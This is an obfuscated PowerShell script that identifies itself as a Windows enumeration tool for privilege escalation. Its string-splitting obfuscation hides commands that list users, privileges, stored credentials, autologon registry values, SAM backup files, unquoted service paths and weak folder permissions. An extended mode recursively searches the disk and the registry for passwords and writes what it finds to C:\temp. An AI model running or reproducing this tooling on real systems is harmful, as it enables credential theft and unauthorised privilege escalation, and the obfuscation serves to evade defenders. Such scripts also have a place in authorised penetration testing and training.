











param(${ex`TE`NDeD})
 
${lIn`es}=("{6}{8}{5}{1}{11}{3}{0}{7}{9}{4}{2}{10}" -f'-','--','---','-','-----','------','----','--','-','---','---','-----------')
function W`HOST(${A}) {
    &("{1}{2}{0}" -f 'st','Wri','te-Ho')
    &("{1}{3}{0}{2}"-f'e-Hos','W','t','rit') -ForegroundColor ("{1}{0}" -f'reen','G') ${L`IneS}
    &("{1}{0}{2}"-f'ri','W','te-Host') -ForegroundColor ("{1}{0}" -f'een','Gr') " "${a} 
    &("{1}{2}{0}" -f 't','Wr','ite-Hos') -ForegroundColor ("{1}{0}" -f 'n','Gree') ${L`iN`ES}
}


&("{1}{0}" -f'st','who') ("{0}{4}{3}{15}{14}{2}{5}{12}{8}{7}{13}{1}{9}{6}{10}{11}" -f 'W','b
','cript v 0.','nu','indows E','1
 ','   ','  by a',' ','
   ',' www.s','ploitspren.com','      ','bsolom','eration S','m')

${STA`N`daRD`_co`mMands} = [ordered]@{

    ("{3}{1}{4}{0}{2}"-f' System ','a','Information','B','sic')                    = ((("{6}{9}{2}{3}{7}{8}{5}{1}{4}{0}" -f'Wait','indow ','-','Process dO','-','wW','Sta','Csysteminfod','OC -NoNe','rt'))."Repla`ce"('dOC',[StrING][CHar]34));
    ("{2}{6}{5}{4}{0}{3}{1}" -f'a','s','Env','ble','ment Vari','ron','i')                       = ((("{2}{8}{9}{0}{7}{1}{5}{6}{3}{4}" -f'dItem E','v: {0} ft','Get-C','a','lue',' Ke','y,V','n','hi','l'))-f [ChaR]124);
    ("{0}{1}{3}{2}"-f'Ne','twork Info','ion','rmat')                         = ((("{11}{0}{7}{8}{10}{6}{3}{13}{12}{4}{5}{2}{1}{9}"-f'tIPConfi','ip','ceDescr','ft I','aceAlias,In','terfa','9c ','g','u','tion,IPv4Address','ration J','Get-Ne','erf','nt'))."R`EPlaCe"(([ChAR]74+[ChAR]57+[ChAR]99),'|'));
    ("{3}{1}{2}{0}" -f'ers','S',' Serv','DN')                                 = ((("{7}{3}{9}{8}{10}{0}{5}{6}{11}{2}{4}{12}{1}{13}"-f 'dd','Pv4','sF','-Dns','a','r','e','Get','tServerAd','Clien','dress -A','s','mily I',' GIP ft'))-RePLace ([CHaR]71+[CHaR]73+[CHaR]80),[CHaR]124);
    ("{1}{0}" -f 'RP cache','A')                                   = ((("{12}{6}{7}{18}{15}{14}{1}{4}{22}{8}{9}{5}{10}{21}{0}{11}{20}{13}{3}{19}{16}{2}{17}"-f 'dex,','dres',',S','ay','sFa','Pv4 Oj1 f','etN','eigh','i','ly I','t','IPAd','Get-N','nkL','-Ad','or ','ddress','tate','b','erA','dress,Li',' ifIn','m'))-repLace([cHar]79+[cHar]106+[cHar]49),[cHar]124);
    ("{1}{3}{0}{2}" -f 'b','Routin','le','g Ta')                               = ((("{13}{8}{22}{4}{10}{2}{14}{1}{0}{20}{15}{7}{9}{19}{11}{17}{3}{6}{21}{12}{5}{18}{16}"-f 't','f',' IPv','u','essFam','i','te','re','Route -','f','ily','Ho','etric,','Get-Net','4 d48 ','ationP','ex','p,Ro','fInd','ix,Next',' Destin','M','Addr'))."Re`pla`ce"(([chAr]100+[chAr]52+[chAr]56),[sTRinG][chAr]124));
    ("{2}{0}{4}{1}{3}" -f 'o','onnection','Netw','s','rk C')                         = ((("{11}{1}{0}{12}{10}{8}{3}{13}{7}{9}{5}{4}{2}{6}" -f '0}n','ocess {','Wait {1}',' -Ar','indow -','o{0} -NoNewW',' ft','0','{0}','}-an','t','Start-Pr','etsta','gumentList {')) -f[CHAR]34,[CHAR]124);
    ("{0}{1}{3}{2}{4}" -f 'Conn','ect','ri','ed D','ves')                            = 'Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft';
    ("{2}{1}{0}{3}" -f' Con','l','Firewal','fig')                             = ((("{8}{9}{14}{13}{0}{4}{3}{7}{10}{12}{11}{5}{1}{6}{2}"-f 'ist {1','Wa',' {0} ft','ll sho','}firewa','ndow -','it','w config{1','S','tart-Process {1}net','} -','NewWi','No','entL','sh{1} -Argum')) -f[chAr]124,[chAr]34);
    ("{0}{2}{1}{3}" -f 'Cu','rent Us','r','er')                                = ('W'+'rit'+'e-Ho'+'st '+('XVD'+'env:Us'+'erD'+'omainlH6'+'XVD'+'e'+'n'+'v:UserName')."Re`pla`ce"(([chaR]108+[chaR]72+[chaR]54),'\')."R`EPLAcE"('XVD',[STRInG][chaR]36));
    ("{1}{0}{2}{3}" -f'Priv','User ','ilege','s')                             = ((("{11}{2}{9}{6}{7}{13}{5}{12}{8}{4}{10}{1}{3}{0}" -f 'ft','-Wai','tart-proc','t KGi ','o','riv',' fKlwhoamifKl -','ArgumentList f','NewWind','ess','w ','s','fKl -No','Kl/p'))  -CREPLAcE ([CHAr]75+[CHAr]71+[CHAr]105),[CHAr]124-Replace 'fKl',[CHAr]34);
    ("{0}{2}{1}"-f'Loc','Users','al ')                                 = ((("{3}{11}{0}{6}{10}{7}{9}{4}{8}{5}{2}{1}"-f 'ca','Logon','ast','G','t Name,Enable','L','lUse','DGC','d,',' f','r ','et-Lo'))-cRePLaCE 'DGC',[cHAR]124);
    ("{2}{3}{0}{4}{1}"-f' in','s','Log','ged',' User')                             = ((("{5}{11}{4}{2}{7}{0}{6}{1}{12}{14}{9}{8}{3}{13}{15}{10}"-f 'winst','-','s {','Wai','s','Start-Proc','a{0} ','0}q','ow -','ind','t','e','No','t {1','NewW','} f'))  -f  [cHaR]34,[cHaR]124);
    ("{4}{5}{3}{0}{1}{2}" -f'ntial Ma','nag','er','de','Cr','e')                          = ((("{0}{1}{6}{11}{2}{5}{8}{7}{9}{12}{13}{4}{14}{3}{10}" -f'start','-pro','mdkey{0} -Ar','w -Wai','t{0} -NoNewW','g','cess {0','mentList ','u','{0}','t {1} ft','}c','/l','is','indo')) -f  [Char]34,[Char]124)
    ("{4}{0}{2}{5}{1}{3}"-f 'Re',' I','g','tems','User Autologon ','istry')               = ((("{21}{34}{41}{33}{36}{23}{27}{1}{5}{16}{29}{6}{19}{44}{9}{15}{40}{28}{10}{17}{2}{43}{3}{0}{39}{24}{13}{14}{31}{32}{38}{35}{37}{4}{30}{12}{42}{11}{22}{7}{8}{20}{26}{25}{18}" -f' N','h {2}Re','}Wi','ows','1} ','gistr','L_','lt','*{2','IN','cros','fa',' ','ren','tVer','E{0}SOFTW','y','oft{0','ft','MAC','}','G','u','ty -','{0}Cur','} ',' {1','Pat','E{0}Mi','::HKEY_LOCA','select','sio','n','em','et-','Logon{2}','Proper',' {','{0}Win','T','AR','It','{2}De','nd','H'))  -F  [ChaR]92,[ChaR]124,[ChaR]34);
    ("{0}{2}{1}" -f 'Loca','s','l Group')                                = ((("{5}{2}{1}{4}{0}{3}"-f ' ft Na',' ','roup','me','{0}','Get-LocalG')) -F [chAr]124);
    ("{2}{0}{1}{5}{4}{3}" -f'Admin','ist','Local ','rs','o','rat')                        = ((("{4}{2}{3}{6}{5}{9}{11}{10}{1}{0}{12}{8}{13}{7}" -f 'o ft Na','s 5D','c','alGroupMe','Get-Lo','m','mber Ad','e','incipalSou','inistra','r','to','me, Pr','rc')) -crEplace  ([cHaR]53+[cHaR]68+[cHaR]111),[cHaR]124);
    ("{3}{1}{0}{4}{2}"-f'Di','r ','es','Use','rectori')                            = ((("{3}{7}{0}{5}{2}{1}{6}{4}{8}"-f 'hi','C','dItem ','Get-','s {0} ft Nam','l',':{1}User','C','e'))-F[Char]124,[Char]92);
    ("{8}{5}{1}{6}{7}{3}{0}{4}{2}" -f'backu','ing','files','SAM ','p ','arch',' for',' ','Se')              = ((("{21}{24}{25}{2}{20}{28}{27}{15}{7}{13}{5}{9}{8}{6}{4}{17}{14}{19}{22}{1}{18}{3}{23}{29}{0}{26}{12}{16}{10}{11}"-f'i','BPs','h','stem3','M ; T','BP','SA','OT','pairNBP','re','kNBP','SAM','e','%N','-','TEMRO','gbac','est','y','Path %SYS',' %','Test','TEMROOT%N','2NBPco','-','Pat','gNBPr','YS','S','nf'))  -cRepLAcE  ([char]78+[char]66+[char]80),[char]92);
    ("{0}{4}{2}{5}{1}{3}"-f 'Runn','sse','g ','s','in','Proce')                           = 'gwmi -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize';
    ("{1}{3}{2}{5}{0}{7}{8}{4}{6}" -f'ftwa','Inst',' ','alled','ie','So','s','re Di','rector')              = ((("{2}{8}{18}{10}{16}{15}{12}{19}{14}{7}{0}{11}{6}{1}{13}{5}{3}{4}{17}{9}"-f'id',' Fi','Get-Child','Q ft Parent,Name,La','s','86)Mid BY','C:NsvProgram','ram FilesM','I','riteTime','em',', Mid','id','les (x','g','M',' ','tW','t','C:NsvPro'))  -rEPlAcE'Nsv',[ChaR]92  -crEPlaCe  'Mid',[ChaR]34-rEPlAcE([ChaR]66+[ChaR]89+[ChaR]81),[ChaR]124);
    ("{2}{4}{3}{1}{0}" -f'stry',' Regi','Soft','n','ware i')                        = ((("{12}{13}{1}{2}{4}{18}{3}{7}{11}{8}{9}{5}{6}{15}{14}{10}{16}{0}{17}"-f 'am','t','em -','gistry:','pat','vySOFTWA','R',':HKEY_LO','_MACH','INEk','ft','CAL','Get-Child','I','0O ','E x',' N','e','h Re'))."R`epL`ACE"(([ChAR]120+[ChAR]48+[ChAR]79),'|').("{0}{2}{1}"-f'rE','e','pLAc').Invoke('kvy','\'));
    ("{5}{4}{0}{6}{3}{1}{2}"-f 'rs ','ryone Perm','issions','e','lde','Fo','with Ev')           = 'Get-ChildItem "C:\Program Files\*", "C:\Program Files (x86)\*" | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match "Everyone"} } catch {}} | ft';
    ((("{4}{8}{0}{3}{9}{1}{5}{2}{7}{10}{6}" -f'lders','h ','ILT',' wi','F','BU','ermissions','INit','o','t','XUser P'))  -REplACE  ([Char]105+[Char]116+[Char]88),[Char]92)       = 'Get-ChildItem "C:\Program Files\*", "C:\Program Files (x86)\*" | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match "BUILTIN\Users"} } catch {}} | ft';
    ("{9}{5}{12}{3}{4}{7}{6}{1}{11}{8}{10}{0}{2}" -f 'Elevat','waysIn','ed','ng ','registry ','e','r Al','fo','t','Ch','all','s','cki') = ((("{11}{23}{18}{6}{12}{5}{20}{19}{4}{17}{9}{22}{13}{15}{1}{10}{16}{0}{2}{8}{14}{21}{7}{3}"-f'c','so','r','IAG ft','SERs','::HKEY','tr','nstallernCD ','osoftsoOWin','SOF','OM','Test-Pa','y','Policie','dowsso','s','i','oO','gis','NT_U','_CURRE','OI','TWAREsoO','th -Path nCDRe')) -rEPLACe 'nCD',[cHar]34  -cREplACe  'IAG',[cHar]124-rEPLACe  'soO',[cHar]92);
    ("{0}{4}{3}{2}{1}"-f 'Unquot','s','ath','d Service P','e')                      = 'gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike ''"*''} | select PathName, DisplayName, Name | ft';
    ("{2}{4}{3}{0}{1}" -f'ed Ta','sks','Sche','ul','d')                             = 'Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State';
    ("{1}{2}{3}{0}"-f 'older','Task','s',' F')                                = ((("{0}{4}{9}{10}{5}{8}{3}{6}{1}{7}{2}"-f 'Ge','ask','0} ft','ndo','t','}W','ws{1}T','s {','i','-ChildIte','m C:{1')) -f [Char]124,[Char]92);
    ("{2}{3}{1}{4}{0}" -f 'nds','om','St','artup C','ma')                            = ((("{11}{5}{17}{18}{4}{12}{6}{8}{0}{13}{20}{10}{9}{3}{19}{7}{1}{16}{14}{2}{15}" -f 'ect','io','S1m','d, ','o','-Ci','se','t','l','n','mma','Get','mmand S1m ',' Na','er ',' fl','n, Us','mInstance Win32_Star','tupC','Loca','me, co'))-RePLaCE'S1m',[cHAR]124);
    
}

${E`xTeN`DeD_cO`mMaN`DS} = [ordered]@{

    ("{5}{2}{3}{1}{0}{6}{7}{8}{4}"-f'n','tte','arching',' for Una','iles','Se','d and Sysprep',' ','f') = 'Get-Childitem ?Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")} | Out-File C:\temp\unattendfiles.txt';
    ("{5}{2}{6}{4}{1}{7}{0}{3}" -f 'e','b.','ch','s','e','Sear','ing for w','config fil')           = ((("{22}{18}{1}{25}{26}{0}{12}{15}{14}{3}{24}{28}{19}{8}{7}{29}{31}{21}{13}{17}{6}{5}{2}{16}{9}{23}{30}{11}{4}{20}{10}{27}" -f'item','t','{1} Out-','0}','{0}we','e ','u','eb.config -File -R','e w','ile','configfiles.tx','}temp',' ','on SilentlyC','th C:{','?Pa','F','ontin','e','d','b','ti','G',' ',' -I','-Chi','ld','t','nclu','ecurse -Erro','C:{0','rAc')) -F [CHar]92,[CHar]124);
    ("{7}{4}{6}{5}{2}{0}{1}{3}"-f 'other interes','ting file','or ','s','earchi','f','ng ','S')    = ((("{7}{18}{34}{16}{26}{40}{38}{29}{32}{0}{21}{30}{12}{35}{10}{27}{39}{1}{9}{22}{28}{5}{6}{33}{25}{3}{17}{15}{4}{36}{23}{20}{24}{8}{14}{19}{13}{37}{31}{11}{2}"-f '0','*','txt','t',' ','ErrorAc','tion ','Ge','e C',',*vnc* -File -R','sw','files.','pa','v',':Y','inue','ld','lyCont','t-C','v0tempY','ut-F',' -Includ','ecurse ','Tn O','il','len','i','ord*,','-',' C','e *','her',':Yv','Si','hi','s','m','0ot','Path','*cred','tem ?'))."Re`PLa`ce"(([chAr]89+[chAr]118+[chAr]48),'\')."rePlA`CE"(([chAr]109+[chAr]84+[chAr]110),[STriNG][chAr]124));
    ("{4}{2}{8}{0}{1}{3}{5}{6}{7}" -f 'r vario','u','ar','s confi','Se','g fil','e','s','ching fo')       = ((("{3}{14}{21}{20}{4}{30}{12}{1}{28}{29}{24}{9}{13}{17}{34}{26}{23}{22}{8}{5}{36}{7}{6}{15}{25}{19}{2}{35}{0}{32}{31}{10}{27}{33}{16}{11}{18}"-f 'Y','Path C','emp','Ge','il','rse ','yContinue M48 O','ion Silentl','e -Recu','httpd-x','f','x','m ?','ampp','t','ut-File','t','.conf,m','t',':vYmt','h','-C','cnf -Fil','.','nf,',' C','ini,my','igfile',':vYm -Include php.ini',',httpd.co','dite','con','m','s.','y.','v','-ErrorAct')).("{1}{0}{2}"-f'EPla','r','CE').Invoke('vYm','\')."rEP`LacE"(([char]77+[char]52+[char]56),'|'))
    ("{5}{1}{4}{2}{3}{0}"-f'words','earch',' pas','s','ing HKLM for','S')             = ((("{0}{12}{7}{14}{1}{5}{6}{3}{15}{2}{4}{11}{9}{13}{8}{10}"-f'r','/f pa','0} Out-Fi','t ','le C:','ssword',' /',' query','s.t','wo','xt','{1}temp{1}hklmpass','eg','rd',' HKLM ','REG_SZ /s {'))-F [chaR]124,[chaR]92);
    ("{2}{6}{1}{4}{0}{3}{5}"-f 'HKCU ','chi','Se','for passw','ng ','ords','ar')             = ((("{11}{2}{10}{7}{13}{1}{4}{12}{5}{6}{0}{9}{8}{3}" -f'le C','t ',' /f passw','t','RE','_S','Z /s yRg Out-Fi','r','sswords.tx',':7zutemp7zuhkcupa','o','reg query HKCU','G','d /'))."rEpl`ACe"('7zu',[sTRiNg][CHar]92)."r`e`PLaCE"('yRg',[sTRiNg][CHar]124));
    ("{7}{0}{3}{2}{1}{6}{5}{4}"-f'rch','l','for fi','ing ',' passwords','s with','e','Sea')       = 'Get-ChildItem c:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.PSPath -notlike "*C:\temp*" -and $_.PSParentPath -notlike "*Reference Assemblies*" -and $_.PSParentPath -notlike "*Windows Kits*"}| Select-String -Pattern "password" | Out-File C:\temp\password.txt';
    
}
function RUNcomMA`N`DS(${CO`M`mANds}) {
    ForEach (${Com`mAnD} in ${C`OmmaNDS}.("{0}{2}{3}{1}" -f'G','umerator','etE','n').Invoke()) {
        &("{0}{1}"-f'who','st') ${C`oMMa`ND}."n`AmE"
        &("{1}{5}{3}{2}{4}{0}" -f'ion','In','-','e','Express','vok') ${C`OmManD}."VAl`Ue"
    }
}


&("{3}{1}{2}{0}"-f'ds','unComma','n','R')(${sTa`NDa`RD_c`OmmAN`Ds})

if (${EXTEn`d`Ed}) {
    if (${EX`TE`NDed}.("{1}{0}{2}"-f 'oLowe','T','r').Invoke() -eq ("{0}{2}{1}"-f 'exten','ed','d')) {
        ${R`E`SULt} = &("{0}{1}{2}"-f 'Tes','t-Pa','th') (("{1}{2}{0}" -f'emp','C:D','YTt'))."r`Epl`ACe"(([ChAr]68+[ChAr]89+[ChAr]84),[StriNG][ChAr]92)
        if (${rE`sult} -eq ${f`Al`sE}) {
            &("{2}{1}{0}"-f'tem','w-I','Ne') (("{0}{1}{2}" -f 'C:','f','MVtemp'))."R`EPla`CE"('fMV',[STRiNg][cHar]92) -type ("{2}{1}{0}"-f'tory','rec','di')
        }
        &("{1}{0}" -f'host','w') ((("{3}{7}{11}{6}{16}{1}{4}{15}{8}{0}{9}{12}{2}{5}{10}{14}{13}" -f'}','it','    This may take a','R','ing',' ','s w','esu','{0','temp{0}','w','lt','
','..','hile.',' to C:','r'))-F [chaR]92)
        &("{0}{1}{2}"-f'RunCom','ma','nds')(${eXTe`Nd`E`d_cOmMA`Nds})
        &("{1}{0}" -f'host','w') ((("{9}{8}{5}{10}{4}{1}{6}{2}{7}{0}{3}" -f' ',' ','files','C:{0}temp{0}','eck','ipt Fin','your ',' in','r','Sc','ished! Ch'))-F  [ChaR]92)
    }
}
else {
    &("{0}{1}" -f'w','host') ("{1}{5}{0}{2}{4}{3}" -f'n','Script ','i','!','shed','fi')
}





